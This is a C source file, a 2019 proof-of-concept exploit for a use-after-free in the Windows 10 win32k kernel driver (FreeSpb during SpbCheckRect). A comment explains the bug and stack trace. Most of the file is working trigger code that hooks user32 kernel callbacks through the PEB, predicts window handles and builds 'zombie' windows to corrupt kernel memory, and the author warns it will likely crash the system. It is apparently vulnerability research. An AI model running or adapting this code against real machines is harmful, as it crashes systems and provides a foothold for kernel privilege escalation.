//
// Gil Dabah 2019
//
// Win32k Smash the Ref - POC #5 - FreeSPB UAF
// Windows 10 x64
//

/*
In SpbCheckRect in the kernel it iterates all over the SPBs something like this:
for (p = g_firstspb; p != NULL; p = next)
{
	next = p->next;
	SpbCheckRect2(); // ATTACK both current SPB and next SPB together.
}

Inside call graph of SpbCheckRect2 function it will eventually call FreeSPB in #1 in the stack below.
Releasing our zombie window (#2) that is associated with the SPB, which in a chain effect release the next SPB too in #3.
Going back to the iteration, it will now UAF an SPB pointer.
So the actual UAF should happen at stack line 0a as it returns to the loop and uses the freed next pointer.

00 win32kfull!FreeSpb								; #3 Freeing next SPB in chain.
01 win32kfull!SpbCheckRect2+0xbe
02 win32kfull!SpbCheckRect+0x4a
03 win32kfull!xxxInternalInvalidate+0xfdb75
04 win32kfull!xxxRedrawWindow+0x20d
05 win32kfull!xxxDestroyWindow+0xe98a1				; #2 Destroying zombie
06 win32kbase!xxxDestroyWindowIfSupported+0x25
07 win32kbase!HMDestroyUnlockedObject+0x69
08 win32kbase!HMUnlockObjectInternal+0x4f
09 win32kbase!HMAssignmentUnlock+0x2d
0a win32kfull!FreeSpb+0x124							; #1 First SPB released
0b win32kfull!SpbCheckRect2+0xbe
0c win32kfull!SpbCheckRect+0x4a
0d win32kfull!SpbCheckPwnd+0x75
0e win32kfull!xxxDWP_SetRedraw+0x136e18
0f win32kfull!xxxRealDefWindowProc+0x641
10 win32kfull!xxxWrapRealDefWindowProc+0x60
11 win32kfull!NtUserfnDWORD+0x2c
12 win32kfull!NtUserMessageCall+0x101

To create an SPB structure for a window we have to call LockWindowUpdate.
Fortunately once we called it and then call DestroyWindow, the lock is really locked in its state machine,
and won't release the reference of the window, thus making it a zombie.

For SpbCheckRect to work, we have to make sure the window is visible even though it's dead,
that's why we do zombie reloading inside SetWindowLong with WS_VISIBLE.

To see the UAF one should set a breakpoint on SpbCheckRect,
and walk over SpbCheckRec2 call, and in the next iteration the pointer should point to a freed memory.
This POC will likely crash the system.
*/

#include <windows.h>
#include <stdio.h>

#define SPBZOMBIECLASS "hellozombie"

HWND g_hWnd = NULL;
int ok = 0;

#define SetWindowState_KERNEL_NO 0x69
#define ClientAllocExtraBytes_NO 0x7b
#define ClientFreeExtraBytes_NO 0x7c

typedef NTSTATUS(*faeb_ptr)(ULONG_PTR);
faeb_ptr g_faeb = NULL;
typedef NTSTATUS(*ffeb_ptr)(ULONG_PTR);
ffeb_ptr g_ffeb = NULL;

ULONG_PTR getPEB()
{
	return (ULONG_PTR)__readgsqword(0x60);
}

ULONG_PTR* getUser32Callbacks()
{
	return *(ULONG_PTR**)((char*)getPEB() + 0x58);
}

DWORD CALLBACK threadProc(LPVOID)
{
	// Create first SPB in the list of SPBs.
	HWND htmpSPB = CreateWindow(SPBZOMBIECLASS, NULL, 0, 0, 0, 200, 200, NULL, NULL, NULL, NULL);
	SetWindowLong(htmpSPB, GWL_STYLE, WS_VISIBLE);

	while (!ok) Sleep(10);
	printf("Step #3\n");
	Sleep(500); // Wait for thread to surely finish.

	printf("Pre final step\n");

	// Dummy window to trigger CheckSpbPwnd inside DWP_SetRedraw.
	HWND h = CreateWindow("button", NULL, 0, 0, 0, 200, 200, NULL, NULL, NULL, NULL);
	// In the stack trace below you can see the call in the kernel to SPB validation functionality
	// and how it removes both SPBs and causes the UAF eventually.
	DefWindowProc(h, WM_SETREDRAW, 1, 0);
	return 0;
}

LRESULT CALLBACK cbtHookProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code == HCBT_CREATEWND)
	{
		static int once = 1;
		if (once)
		{
			printf("Step #6\n");
			printf("CBT hook\n");
			if (g_hWnd == (HWND)wParam) // Just make sure it's our window.
			{
				// Stop dead right in the middle of xxxCreateWindow.
				// This will leave the window untampered, and the user-mode pointer to the
				// extra bytes is still loaded as is.
				ok = 1;
				ExitThread(0);
			}
		}
	}

	return 0;
}

LRESULT CALLBACK wndproc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == WM_STYLECHANGING)
	{
		printf("style changing\n");
		// Create an SPB for the window.
		// Set window rect, because it wasn't set yet since our hook is called too early :)
		// Needed for LockWindowUpdate to succeed in SPB creation.
		MoveWindow(hWnd, 0, 0, 200, 200, TRUE);
		LockWindowUpdate(hWnd);
		// SPB holds a reference to the window.

		// Destroy the window to make it a zombie.
		// SPB is locked and thus won't get released by the destruction.
		DestroyWindow(hWnd);
	}
	return DefWindowProc(hWnd, msg, wParam, lParam);
}

LRESULT CALLBACK faeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #2\n");
		printf("Client alloc extra bytes called\n");

		// Predict the HWND of our newly created window.
		// we know that a UI handle is divided to two parts, high word and low word.
		// The high word is the one that has the handle unique number,
		// and is bumped by one every time an object is freed.
		// So we use the last g_hWnd1 from the windows we created initially in main.
		// And add one for it to compensate on that last window destruction.
		WORD nextHandle = HIWORD(g_hWnd) + 1;
		// The low word is the index into the handle table, and stays the same.
		WORD indexHandle = LOWORD(g_hWnd);
		// And now we form a DWORD out of these two words, hopefully with the correct full HWND.
		g_hWnd = (HWND)((ULONG_PTR)indexHandle | ((ULONG_PTR)nextHandle << 16));

		printf("Hook it: %p, %d\n", g_hWnd, IsWindow(g_hWnd));
		printf("Step #5\n");

		// The problem is that xxxCreateWindowEx in kernel call this alloc stub too early and the window version isn't set yet.
		typedef ULONG_PTR(WINAPI *NtUserCallHwndParamPtr)(HWND hWnd, DWORD v, SIZE_T procNumber);
		NtUserCallHwndParamPtr NtUserCallHwndParam = (NtUserCallHwndParamPtr)GetProcAddress(GetModuleHandle("win32u"), "NtUserCallHwndParam");
		NtUserCallHwndParam(g_hWnd, 0x502, SetWindowState_KERNEL_NO); // 502 is the window version and 0x69 SetWindowState function.
		// Window version 0x502 is needed so SetWindowLong will call us back with WM_STYLECHANGING.
		Sleep(500);

		// Now turn our window into a zombie that has the second SPB (which will be the first in the kernel linked list).
		SetWindowLong(g_hWnd, GWL_STYLE, WS_VISIBLE);
		// This goes back to xxxCreateWindow to store the user-mode pointer we just give it.
	}

	return g_faeb(a);
}

LRESULT CALLBACK ffeb(ULONG_PTR a)
{
	static int once = 1;

	if (once)
	{
		once = 0;
		printf("Step #7\n");
		printf("Client free extra bytes called\n");

		// Can try to catch the SPB freed block here.
	}

	return g_ffeb(a);
}

void hookClientCallback(void** ptr, void* stub, DWORD fn)
{
	ULONG_PTR* ptrAddr = &getUser32Callbacks()[fn];
	*ptr = *(void**)ptrAddr;
	DWORD oldProt = 0;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), PAGE_READWRITE, &oldProt);
	*(ULONG_PTR*)ptrAddr = (ULONG_PTR)stub;
	VirtualProtect((LPVOID)ptrAddr, sizeof(void*), oldProt, &oldProt);
}

int main()
{
	WNDCLASS wc = { 0 };
	wc.lpszClassName = SPBZOMBIECLASS;
	wc.lpfnWndProc = wndproc;
	// This is crucial for xxxCreateWindowEx to do client-extra-bytes allocation/deallocation.
	wc.cbWndExtra = 100;
	RegisterClass(&wc);

	// Create the thread early this time, so it creates the first SPB.
	CreateThread(NULL, 0, threadProc, NULL, 0, NULL);

	// We have a problem where the callback to client allocation stub doesn't supply
	// the HWND of the window we're creating.
	// And unfortunately, it's the first callback from window creation process,
	// meaning that no other mechanism like a CBT hook is helpful.
	// We need to allocate a few windows and destroy them, so the free list is bigger.
	// This raises the probability to predict the HWND from the client allocation stub.
	// Create a dummy window, to get the next HWND handle allocation.
	// Notice how we use the global HWND, so we can predict the HWND of the final window created
	// below in the client allocation stub based on this window we're destroying.
	for (int i = 0; i < 100; i++)
	{
		g_hWnd = CreateWindow(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
		DestroyWindow(g_hWnd);
	}

	printf("Step #1\n");

	hookClientCallback((void**)&g_faeb, (void*)faeb, ClientAllocExtraBytes_NO);
	hookClientCallback((void**)&g_ffeb, (void*)ffeb, ClientFreeExtraBytes_NO);

	// CBT is where we terminate our own thread.
	SetWindowsHookEx(WH_CBT, cbtHookProc, NULL, GetCurrentThreadId());
	// Remember that by the time CreateWindow returns, we're already done juggling with the window.
	CreateWindowEx(0, wc.lpszClassName, NULL, WS_OVERLAPPEDWINDOW, 0, 0, 0, 0, NULL, NULL, NULL, NULL);

	return 0;
}
